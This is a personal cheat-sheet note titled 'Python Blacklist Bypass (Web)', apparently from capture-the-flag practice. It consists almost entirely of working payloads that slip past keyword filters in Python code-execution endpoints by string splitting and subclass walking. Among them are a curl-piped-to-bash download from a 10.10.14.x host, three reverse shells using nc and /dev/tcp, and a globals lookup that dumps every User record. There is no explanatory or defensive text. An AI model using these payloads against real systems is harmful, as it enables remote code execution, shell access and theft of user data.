---
title: "Python Blacklist Bypass (Web)"
category: "web"
type: "technique"
tags: ["my-notes", "personal", "python", "blacklist", "bypass", "web"]
summary: "Personal note: Python Blacklist Bypass (Web)."
source:
  name: "Personal notes"
origin_path: "Web/python blacklist bypass.md"
---

```python
code=x=getattr(sys.modules['o'%2b's'],"po"%2b"pen")('curl+10.10.14.1/x.sh+|+bash'
```

```python
print(().__class__.__bases__[0].__subclasses__()[317]('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.XX 443 >/tmp/f', shell=True))
```

```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'o""s." in str(x) ][0]['sy''stem']('/bin/bash -c \'/bin/bash -i > /dev/tcp/10.10.14.XX/1337 0<&1 2>&1\'')
```

```python
# find the 'User'
print([name for name in globals().keys() if callable(globals()[name])])

# then query the 'User'
users = globals()['User'].query.all()
for user in users:
    print(user.__dict__)
```

```python
code=print(globals().keys())
```

```python
sys.modules["subp"+"rocess"].run(["/bin/bash","-c","/bin/bash+-i+>%26+/dev/tcp/10.10.14.35/4422+0>%261"])
```

---

*From your own notes: `Web/python blacklist bypass.md`*
